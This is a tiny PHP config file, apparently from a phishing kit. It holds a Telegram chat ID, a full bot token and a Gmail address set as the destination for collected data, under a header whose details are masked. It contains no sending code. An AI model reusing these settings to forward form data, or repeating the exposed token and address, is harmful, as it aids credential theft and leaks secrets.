<?php
/**

 * Group Chat   :  EEEEE 
 * @telegram   :   EEEE
 * Project Name:   EEEEE
 * Author      :   EEEEEE

 * channel Telegram  :  EEEEEEE
 */

// telegram

$chat_id = "5192985270";
$bot_token = "6038674513:AAHJl_ru4UCCkHosyVAw-dwAcJ-I6sGlI6M";
// email
$to = 'morycamaralife@gmail.com';


?>